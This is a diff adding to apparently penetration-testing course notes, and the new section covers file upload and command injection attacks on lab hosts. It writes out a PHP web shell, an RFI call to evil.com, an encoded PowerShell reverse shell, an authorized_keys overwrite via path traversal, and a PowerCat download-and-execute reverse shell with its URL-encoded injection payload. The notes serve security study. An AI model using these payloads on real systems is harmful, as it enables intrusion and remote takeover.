@@ -12,7 +12,8 @@
   - [12. Client-site attacks](#12-client-site-attacks)
   - [13. Locating public exploits](#13-locating-public-exploits)
   - [14. Fixing exploits](#14-fixing-exploits)
-  - [15. Antivirus evasion](#15-antivirus-evasion)
+  - [15. Antivirus evasion](#15-antivirus-evasion)![image](https://github.com/user-attachments/assets/ab252aac-a0dd-446a-8df2-081dbc09ce7a)
+
   - [16. Password attacks](#16-password-attacks)
   - [18. Linux privilege escalation](#18-linux-privilege-escalation)
   - [19. Port redirection and SSH tunneling](#19-port-redirection-and-ssh-tunneling)
@@ -407,8 +408,44 @@
         - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
         - shell.txt `<?php system($_GET['cmd']); ?>` then run `http://target.com/index.php?page=http://evil.com/shell.txt&cmd=id`
     - File upload vulnerabilities
-      - 
-    - Command injection
+      - scenarios: directory traversal + overwrite authorized_keys; file upload XXE or XSS; macros in docx.  
+      - file upload + code execution to obtain reverse shell  
+      - **upload txt file** (acceped) > bypass php file extension (.phps, .php7, pHP)  
+      - **execute command** `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
+      - kali webshells at **"/usr/share/webshells/"**
+      - step 2: netcat listener `nc -nvlp 4444` while listening 
+      - step 3: PowerShell one-liner to encode the reverse shell  
+      - step 4: execute the base64 encoded reverse shell oneliner
+      ```
+      curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
+      enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
+      dAAuAFMAbwBjAGsAZQB0
+      ...
+      AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
+      GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+      ```
+      - trial and error tricks: upload file 2 times (file already exists then burte force, error for language/web tech)  
+      - **modify the filename** `../../../../../test.txt` in burp request  
+      - overwrite the authorized_keys (non executable file)    
+        - `ssh-keygen` : generate public/private rsa key pair
+        - `cat fileup.pub > authorized_keys` : our public key  
+        - `./../../../../../../root/.ssh/authorized_key` upload it using the relative path (burp intercept the request and modify the filename > forward)  
+        - `rm ~/.ssh/known_hosts`: avoid error that cannot verify the host key saved previously  
+        - `ssh -p 2222 -i fileup root@mountaindesserts.com`: use our private key to ssh
+    - Command injection  
+      - git clone https://gitlab.com/exploit-database/exploitdb.git (skip this step)  
+      - bad commands detected (ipconfig), try git
+      - `curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive` : %3B is semi colon, windows use 1 ampersand  
+      - identify the commands are executed by PowerShell or CMD  
+      - `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`: Code Snippet to check where our code is executed  
+      - `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`: URL encoding. Output shows PowerShell  
+      
+      - `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`use PowerCat to create a reverse shell  
+      - `python3 -m http.server 80`
+      - `nc -nvlp 4444`  
+      - `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell`: Command to download PowerCat and execute a reverse shell  
+      - `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive`  
+
 ### 10. SQL injection attacks
 ### 11. Phishing Basics
 ### 12. Client-site attacks
